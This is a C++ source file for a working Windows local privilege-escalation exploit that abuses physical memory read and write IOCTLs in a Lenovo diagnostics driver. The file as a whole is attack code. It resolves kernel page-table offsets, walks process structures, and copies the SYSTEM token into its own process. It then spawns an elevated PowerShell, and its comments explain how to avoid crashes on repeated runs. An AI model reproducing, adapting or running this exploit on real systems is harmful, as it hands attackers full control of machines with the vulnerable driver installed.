#include <iostream>
#include <Windows.h>
#include <Psapi.h>

#define PHYSICAL_READ 0x222010
#define PHYSICAL_WRITE 0x222014

HANDLE hDriver;
uintptr_t storage_address = -1;

// Get the base address of any loaded modules/drivers on the system by name
uintptr_t GetKernelModuleBase(const char* module_name)
{
	DWORD cb = 0;
	LPVOID drivers[1024] = { 0 };
	char szDriver[1024];

	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cb))
	{
		for (int i = 0; i < cb / sizeof(drivers[0]); i++)
		{
			if (!GetDeviceDriverBaseNameA(drivers[i], szDriver, sizeof(szDriver)))
			{
				printf("[-] Error %d getting name of kernel module\n", GetLastError());
				break;
			}

			if (strncmp(szDriver, module_name, strlen(module_name)) == 0)
			{
				return (uintptr_t)drivers[i];
			}
		}
	}
	else
		printf("[-] Error %d enumerating loaded drivers\n", GetLastError());

	return 0;
}

// Wrapper for the physical write function in the driver
bool PhysicalWrite(uintptr_t address, uintptr_t value, unsigned int size)
{
	DWORD dwBytesReturned;
	uintptr_t input[3] = { 0 };
	uintptr_t output;

	input[0] = address;
	input[1] = size;
	input[2] = (uintptr_t)value;

	if (!DeviceIoControl(hDriver, PHYSICAL_WRITE, input, sizeof(input), &output, 0, &dwBytesReturned, 0))
	{
		printf("[-] Error %d sending physical write to driver\n", GetLastError());
		return false;
	}
	return true;
}

// Wrapper for the physical read function in the driver
uintptr_t PhysicalRead(uintptr_t address, unsigned int size)
{
	DWORD dwBytesReturned;
	uintptr_t input[2] = { 0 };
	uintptr_t output;

	input[0] = address;
	input[1] = size;

	if (!DeviceIoControl(hDriver, PHYSICAL_READ, input, sizeof(input), &output, sizeof(output), &dwBytesReturned, 0))
	{
		printf("[-] Error %d sending physical read to driver\n", GetLastError());
		return -1;
	}
	return output;
}

// Little trick to get a virtual read since if we can find an unused physical address we can just write to that location to have a static place we can read
// we get a virtual read from this since the physical write function in the driver dereferences the user provided address before writing it
uintptr_t VirtualRead(uintptr_t address, unsigned int size)
{
	PhysicalWrite(storage_address, address, 8);
	return PhysicalRead(storage_address, size);
}

// Used to find the likely unused location as mentioned above
void FindEmptyPhysical()
{
	uintptr_t address = 0x100;

	while (storage_address != 0)
	{
		storage_address = PhysicalRead(address, 8);
		address += 8;
	}
	storage_address = address;
}

// Used to navigate the MmGetPhysicalAddress to dynamically resolve the offset to where page table entries are stored in the kernel since its randomized on boot
// This is meant to find an instruction refering to it in one of the calls to MiFillPteHierarchy
uintptr_t FindPTEOffset()
{
	uintptr_t ntoskrnl;
	uintptr_t PTEOffset = 0;
	char* PTEOffsetPtr = 0;
	unsigned int offset = 0;
	unsigned int iterator = 0;

	ntoskrnl = (uintptr_t)LoadLibraryA("C:\\windows\\system32\\ntoskrnl.exe");
	if (ntoskrnl == 0)
	{
		printf("[-] Error %d loading local instance of ntoskrnl.exe\n", GetLastError());
		return 0;
	}

	PTEOffsetPtr = (char*)GetProcAddress((HMODULE)ntoskrnl, "MmGetPhysicalAddress");

	while (true)
	{
		if (*PTEOffsetPtr == '\xe8')
		{
			offset = *(unsigned int*)(PTEOffsetPtr + 1);
			break;
		}
		PTEOffsetPtr++;
	}

	PTEOffsetPtr += offset;

	iterator = 0;
	while (true)
	{
		if (*PTEOffsetPtr == '\x48' && *(PTEOffsetPtr + 1) >= '\xb8' && *(PTEOffsetPtr + 1) <= '\xbf')
		{
			PTEOffset = *(uintptr_t*)(PTEOffsetPtr + 2);
			if ((PTEOffset & 0xfff0000000000000) == 0xfff0000000000000)
				break;
		}
		else if (*PTEOffsetPtr == '\x49' && *(PTEOffsetPtr + 1) >= '\xb8' && *(PTEOffsetPtr + 1) <= '\xbf')
		{
			PTEOffset = *(uintptr_t*)(PTEOffsetPtr + 2);
			if ((PTEOffset & 0xfff0000000000000) == 0xfff0000000000000)
				break;
		}
		PTEOffsetPtr++;
	}
	PTEOffset = (uintptr_t)PTEOffsetPtr;
	PTEOffset -= ntoskrnl;
	FreeLibrary((HMODULE)ntoskrnl);

	ntoskrnl = GetKernelModuleBase("ntoskrnl.exe");
	if (ntoskrnl == 0)
	{
		printf("[-] Unable to get base address of ntoskrnl.exe in the kernel\n");
		return 0;
	}

	PTEOffset += ntoskrnl + 2;
	return VirtualRead(PTEOffset, 8);
}

// Mimics the MiFillPteHierarchy function to resolve the Page Map Level 4 Entry (PML4E/PXE), Page Directory Pointer (PDPE/PPE), Page Directory Entry (PDE), and Page Table Entry (PTE) for a given virtual address
void FillPteHierarchy(uintptr_t address, uintptr_t* pte, uintptr_t offset)
{
	for (int i = 0; i < 4; i++)
	{
		address >>= 9;
		address &= 0x7ffffffff8;
		address += offset;
		pte[i] = address;
	}
}

// Mimics the MiVaToPfn function to get the Page Frame Number for a given virtual address
uintptr_t MiVaToPfn(uintptr_t address, uintptr_t* uiPteHierarchy)
{
	uintptr_t out;
	uintptr_t uiTempAddress;
	uintptr_t uiTempAddress2;
	uintptr_t offset;
	int page_count = 1;
	int i;

	for (i = 3; i > 0; i--)
	{
		out = VirtualRead(uiPteHierarchy[i], sizeof(uintptr_t));
		if ((out & 0x80u) != 0)
			break;
	}
	out = ((out >> 12) & 0xFFFFFFFFF);

	if (i)
	{
		page_count = 1;
		uiTempAddress = address >> 12;
		do
		{
			uiTempAddress2 = uiTempAddress;
			uiTempAddress >>= 9;
			offset = page_count * (uiTempAddress2 & 0x1ff);
			page_count <<= 9;
			out += offset;
			i--;
		} while (i);
	}
	return out;
}

// Mimics the MI_IS_PHYSICAL_ADDRESS function
uintptr_t MI_IS_PHYSICAL_ADDRESS(uintptr_t address, uintptr_t* uiPteHierarchy, uintptr_t offset)
{
	uintptr_t PteAddress;

	for (int i = 3; i > 0; i--)
	{
		PteAddress = VirtualRead(uiPteHierarchy[i], sizeof(uintptr_t));
		if (PteAddress & 1)
		{
			return 0;
		}
		else if (PteAddress & 0x80u)
		{
			return 1;
		}
	}
	return 0;
}

// Wrapper for all physical address functions, meant to be as simple as calling MmGetPhysicalAddress from the kernel
uintptr_t MmGetPhysicalAddress(uintptr_t va)
{
	uintptr_t uiPteHierarchy[4];
	uintptr_t uiPteOffset;
	uintptr_t uiPfn;
	uintptr_t uiPteAddress;

	uiPteOffset = FindPTEOffset();
	if (uiPteOffset == 0)
		return -1;
	printf("[+] PTE Offset %llx\n", uiPteOffset);

	FillPteHierarchy(va, uiPteHierarchy, uiPteOffset);

	if (MI_IS_PHYSICAL_ADDRESS(va, uiPteHierarchy, uiPteOffset))
	{
		uiPfn = MiVaToPfn(va, uiPteHierarchy);
		printf("[+] Page Frame Number %llx\n", uiPfn);
		return (uiPfn * 0x1000) + (va & 0xfff);
	}
	else
	{
		uiPteAddress = VirtualRead(uiPteHierarchy[0], sizeof(uintptr_t));
		uiPfn = ((uiPteAddress >> 12) & 0xFFFFFFFFF);
		printf("[+] Page Frame Number %llx\n", uiPfn);
		return (uiPfn * 0x1000) + (va & 0xfff);
	}
}

// Puts all the exploit code together
bool Exploit()
{
	HMODULE localNtoskrnl;
	DWORD dwLocalPid;
	DWORD dwPid;
	uintptr_t ntoskrnl;
	uintptr_t PsInitialSystemProcess;
	uintptr_t SystemToken;
	uintptr_t CurrentEPROCESS;
	uintptr_t LocalTokenPhysicalAddress;
	uintptr_t StorageResetValue = 0;

	localNtoskrnl = LoadLibraryA("C:\\Windows\\System32\\ntoskrnl.exe");
	if (localNtoskrnl == 0)
	{
		printf("[-] Error %d loading local ntoskrnl.exe\n", GetLastError());
		return false;
	}
	printf("[+] Opened local ntoskrnl.exe\n");

	PsInitialSystemProcess = (uintptr_t)GetProcAddress(localNtoskrnl, "PsInitialSystemProcess");
	if (PsInitialSystemProcess == 0)
	{
		printf("[-] Error %d getting offset to PsInitialSystemProcess\n", GetLastError());
		return false;
	}
	PsInitialSystemProcess -= (uintptr_t)localNtoskrnl;
	printf("[+] PsInitialSystemProcess offset %llx\n", PsInitialSystemProcess);
	FreeLibrary(localNtoskrnl);

	ntoskrnl = GetKernelModuleBase("ntoskrnl.exe");
	if (ntoskrnl == 0)
	{
		printf("[-] Error getting kernel address of ntoskrnl.exe\n");
		return false;
	}
	printf("[+] ntoskrnl address %llx\n", ntoskrnl);

	PsInitialSystemProcess += ntoskrnl;
	printf("[+] PsInitialSystemProcess at %llx\n", PsInitialSystemProcess);

	FindEmptyPhysical();

	CurrentEPROCESS = VirtualRead(PsInitialSystemProcess, sizeof(uintptr_t));
	printf("[+] System Process EPROCESS structure %llx\n", CurrentEPROCESS);
	SystemToken = VirtualRead((uintptr_t)(CurrentEPROCESS + 0x4b8), sizeof(uintptr_t));
	printf("[+] System token %llx\n", SystemToken);

	dwLocalPid = GetCurrentProcessId();
	printf("[+] Local PID %d\n", dwLocalPid);

	while (1)
	{
		CurrentEPROCESS = VirtualRead(CurrentEPROCESS + 0x448, sizeof(uintptr_t));
		CurrentEPROCESS -= 0x448;
		
		dwPid = VirtualRead(CurrentEPROCESS + 0x440, sizeof(uintptr_t));
		if (dwPid == dwLocalPid)
			break;
	}
	printf("[+] Local EPROCESS %llx\n", CurrentEPROCESS);

	LocalTokenPhysicalAddress = MmGetPhysicalAddress(CurrentEPROCESS + 0x4b8);
	printf("Local token physical address %llx\n", LocalTokenPhysicalAddress);
	
	// Extra call here to rezero out our storage address since on subsequent executions of the exploit if this address isn't overwritten it will use a different physical address
	// Which in testing will blue screen the computer after a few uses of the exploit (usually 3) since it ends up overwriting something important
	PhysicalWrite(storage_address, (uintptr_t)&StorageResetValue, sizeof(uintptr_t));
	return PhysicalWrite(LocalTokenPhysicalAddress, (uintptr_t)&SystemToken, sizeof(uintptr_t));
}

int main()
{
	uintptr_t ntoskrnl;
	uintptr_t value;
	STARTUPINFOA startInfo;
	PROCESS_INFORMATION procInfo;

	hDriver = CreateFileA("\\\\.\\LenovoDiagnosticsDriver", GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (hDriver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error %d opening handle to driver\n", GetLastError());
		goto exit;
	}

	if (Exploit())
	{
		memset(&startInfo, 0, sizeof(startInfo));
		memset(&procInfo, 0, sizeof(procInfo));

		startInfo.cb = sizeof(startInfo);

		if (!CreateProcessA(0, (LPSTR)"powershell.exe", 0, 0, 0, 0, 0, 0, &startInfo, &procInfo))
		{
			printf("[-] Error %d starting powershell\n", GetLastError());
		}
		else
		{
			WaitForSingleObject(procInfo.hProcess, INFINITE);
			CloseHandle(procInfo.hThread);
			CloseHandle(procInfo.hProcess);
		}
	}
	else
	{
		printf("[-] Failed to elevate privileges\n");
	}

exit:
	return 0;
}